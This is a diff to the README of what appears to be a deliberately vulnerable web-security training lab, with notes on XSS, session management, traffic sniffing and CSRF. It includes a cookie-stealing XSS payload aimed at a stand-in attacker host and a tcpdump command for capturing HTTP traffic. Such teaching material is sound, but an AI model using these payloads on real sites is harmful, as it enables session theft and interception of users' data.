@@ -43,10 +43,24 @@ vagrant plugin install vagrant-vbguest
 ```html
 "><script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>"
 ```
-___
+
+### Broken Session Management
+* application with URL rewriting
+* no logout and session timeout
+
+### Sensitive Data Exposure
+* to monitor HTTP traffic
+```bash
+root> tcpdump -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
+```
+
+### Cross-Site Request Forgery
+* try this: http://192.168.33.10/index.php?action=create&notice=pokus
+
+
 
 ### TODOs:
-- misconfiguration - ukazat ze to vylistuje adresar - udelat novyho virtualhosta nebo
+- misconfiguration - show e.g directory listing when apache configuration is set to allow that (create new virtualhost or modify the default)
 - directory traversal
 
 
